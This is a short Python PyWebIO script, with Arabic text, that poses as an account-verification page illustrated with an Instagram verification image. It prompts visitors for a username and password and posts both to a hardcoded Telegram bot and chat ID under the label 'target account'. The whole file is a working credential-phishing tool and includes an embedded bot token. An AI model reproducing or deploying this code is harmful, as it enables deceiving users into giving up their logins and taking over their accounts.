from pywebio import start_server
import requests
from pywebio.input import *
from pywebio.pin import *
from pywebio.session import *
from pywebio.output import *

took = ("5964228671:AAEAVO7vkjb2_FSN4Mu44NubfCBNkD4_dm8")

idd = ('1178940954')


popup ("اهلا وسهلا ",
put_text("عدد الداعمين ").onclick(lambda: toast("11"))),
put_html('<center><h3>الموافقين على التوثيق</h3><img src ="https://i0.wp.com/jnyhnews.com/wp-content/uploads/2022/04/%D8%B7%D8%B1%D9%8A%D9%82%D8%A9-%D8%AA%D9%88%D8%AB%D9%8A%D9%82-%D8%AD%D8%B3%D8%A7%D8%A8-%D8%A7%D9%86%D8%B3%D8%AA%D8%BA%D8%B1%D8%A7%D9%85.png" width=400 ></center>'), #الصوره


aa  = input("username")
app = input("password")

telegram_sand = (f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idd}&text=target account\npassword : {aa}\nusername : {app}')
RQ=requests.post(telegram_sand)
start_server(port=6585, debug=True)

